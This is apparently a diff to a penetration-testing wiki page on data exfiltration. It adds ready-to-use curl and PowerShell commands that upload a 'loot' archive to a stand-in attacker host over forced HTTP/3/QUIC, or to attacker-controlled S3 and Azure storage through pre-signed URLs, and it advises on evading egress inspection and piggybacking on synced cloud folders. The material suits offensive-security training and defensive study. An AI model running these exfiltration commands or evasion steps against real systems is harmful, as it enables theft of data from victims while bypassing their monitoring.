@@ -119,6 +119,58 @@ if __name__ == "__main__":
 ###
 ```
 
+### HTTP/3 / QUIC
+
+If the egress controls are tuned for classic **TCP/443** inspection but are permissive with **UDP/443**, forcing **HTTP/3** can move the transfer into **QUIC** instead of TLS-over-TCP. The attacker endpoint needs native HTTP/3 support (for example, a reverse proxy or upload endpoint already advertising `Alt-Svc: h3`).
+
+```bash
+# Strict: fail if QUIC/H3 is not available
+curl --http3-only -T loot.7z https://attacker-h3.example/upload
+
+# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
+curl --http3 -T loot.7z https://attacker-h3.example/upload
+
+# Learn the server's Alt-Svc advertisement and reuse it
+curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
+curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
+```
+
+A 2025 research paper (QUIC-Exfil) showed that QUIC features such as encrypted headers and connection migration can make firewall-level detection of exfiltration harder than classic TLS or DNS-based channels, so expect this space to become more relevant as HTTP/3 support spreads.
+
+### Pre-signed / delegated object-storage uploads
+
+When you can mint or obtain a short-lived **signed URL**, the victim only needs a normal HTTPS client. This avoids installing cloud SDKs or long-lived credentials on the host and blends into common object-storage traffic.
+
+**Linux / macOS (AWS S3 pre-signed `PUT`)**
+
+```bash
+curl -X PUT -T loot.7z \
+  -H 'Content-Type: application/octet-stream' \
+  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
+```
+
+**Windows PowerShell (AWS S3 pre-signed `PUT`)**
+
+```powershell
+Invoke-WebRequest -Method Put -InFile .\loot.7z `
+  -ContentType 'application/octet-stream' `
+  -Uri $presignedUrl
+```
+
+**Azure Blob SAS URL**
+
+```bash
+curl -X PUT --data-binary @loot.7z \
+  -H 'x-ms-blob-type: BlockBlob' \
+  -H 'Content-Type: application/octet-stream' \
+  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
+```
+
+Notes:
+- Pre-signed URLs / SAS tokens usually scope the **path**, **HTTP method**, and **expiration**.
+- For Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` is mandatory.
+- This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.
+
 ### goshs
 
 [goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server` 
@@ -268,7 +320,12 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 Notes:
 - `crypt` can encrypt both file contents and names.
 - `chunker` transparently splits large files and reassembles them on download.
-- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection. For short-lived operations, prefer a dedicated temporary config and remove it afterwards.
+- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection. For short-lived operations, prefer a dedicated temporary config and remove it afterwards. If you must keep it longer, prefer encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) over leaving a bare `rclone.conf` on disk.
+- If the target already syncs **OneDrive**, **Google Drive**, or **Dropbox**, copying loot into the synchronized directory can piggyback on an already-approved client instead of dropping a new transfer binary.
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
+{{#endref}}
 
 ## FTP
 
@@ -574,5 +631,7 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
+- [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
 
 {{#include ../banners/hacktricks-training.md}}
